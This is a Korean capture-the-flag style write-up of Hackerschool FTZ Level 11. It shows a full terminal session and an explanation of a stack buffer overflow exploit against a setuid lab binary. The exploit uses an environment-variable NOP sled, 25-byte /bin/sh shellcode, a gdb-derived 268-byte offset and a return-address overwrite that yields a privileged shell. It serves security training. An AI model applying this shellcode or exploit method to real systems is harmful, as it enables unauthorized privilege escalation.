# Hackerschool FTZ Level 11

```
login as: level11
level11@192.168.18.131's password:
[level11@ftz level11]$ ls
attackme  hint  public_html  tmp
[level11@ftz level11]$ cat hint

#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}


[level11@ftz level11]$ vi /tmp/ge
```

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
        printf("%p\n", getenv(argv[1]));
        return 0;
}
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
"/tmp/ge.c" 7L, 122C                                          1,1           All
```

```
[level11@ftz level11]$ mv /tmp/ge /tmp/ge.c
[level11@ftz level11]$ gcc -o /tmp/ge /tmp/ge.c
[level11@ftz level11]$ export EGG=`python -c 'print "\x90"*1024+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[level11@ftz level11]$ /tmp/ge EGG
0xbffff8a2
[level11@ftz level11]$ gdb attackme
GNU gdb Red Hat Linux (5.3post-0.20021129.18rh)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux-gnu"...
(gdb) disas main
Dump of assembler code for function main:
0x08048470 <main+0>:    push   %ebp
0x08048471 <main+1>:    mov    %esp,%ebp
0x08048473 <main+3>:    sub    $0x108,%esp
0x08048479 <main+9>:    sub    $0x8,%esp
0x0804847c <main+12>:   push   $0xc14
0x08048481 <main+17>:   push   $0xc14
0x08048486 <main+22>:   call   0x804834c <setreuid>
0x0804848b <main+27>:   add    $0x10,%esp
0x0804848e <main+30>:   sub    $0x8,%esp
0x08048491 <main+33>:   mov    0xc(%ebp),%eax
0x08048494 <main+36>:   add    $0x4,%eax
0x08048497 <main+39>:   pushl  (%eax)
0x08048499 <main+41>:   lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:   push   %eax
0x080484a0 <main+48>:   call   0x804835c <strcpy>
0x080484a5 <main+53>:   add    $0x10,%esp
0x080484a8 <main+56>:   sub    $0xc,%esp
0x080484ab <main+59>:   lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:   push   %eax
0x080484b2 <main+66>:   call   0x804833c <printf>
0x080484b7 <main+71>:   add    $0x10,%esp
0x080484ba <main+74>:   leave
0x080484bb <main+75>:   ret
0x080484bc <main+76>:   nop
0x080484bd <main+77>:   nop
---Type <return> to continue, or q <return> to quit---
0x080484be <main+78>:   nop
0x080484bf <main+79>:   nop
End of assembler dump.
(gdb) quit
[level11@ftz level11]$ ./attackme `python -c 'print "\x90"*268+"\xff\xf8\xff\xbf"'`
sh-2.05b$ my-pass
TERM environment variable not set.

Level12 Password is "it is like this".

sh-2.05b$
```

버퍼오버플로우에 대한 문제이다.

이 문제에서는 환경변수에 `NOP(0x90) Sled` 와, 쉘코드를 넣어놓고, 환경변수의 주소로 리턴주소를 조작하면 된다.

먼저 소스를 보면  `char str[256]` 을 버퍼 통해 공간을 생성하고,

`setreuid` 를 통해서 `level12` 의 권한으로 변경한 뒤,

`strcpy`를 통해 `str`에 `argv[1]`(첫번째 인자)를 복사해준다.

그리고 마지막으로 `str` 을 그대로 출력한다.

환경변수의 주소를 확인하기 위해 `/tmp/ge` 바이너리를 만든다.

소스는 다음과 같다.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
        printf("%p\n", getenv(argv[1]));
        return 0;
}
```

여기서 사용한 방식은 1024 만큼의 `NOP Sled`와 25 바이트 쉘코드이다.

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`

[출처](https://github.com/sunghun7511/Study/blob/master/Security/Useful_shellcodes.md)

`gdb`를 통해서 리턴 어드레스와의 거리를 계산해보면

`0x08048473 <main+3>:    sub    $0x108,%esp`

0x108 + 0x4 = 0x10C(268)

즉, 268만큼의 더미 데이터와 쉘코드의 주소를 넣어주면 된다.

```
[level11@ftz level11]$ /tmp/ge EGG
0xbffff8a2
```

`EGG` 라는 환경변수의 주소는 `0xbffff8a2` 이므로, 다음과 같이 넣어주면 된다.

```
[level11@ftz level11]$ ./attackme `python -c 'print "\x90"*268+"\xff\xf8\xff\xbf"'`
```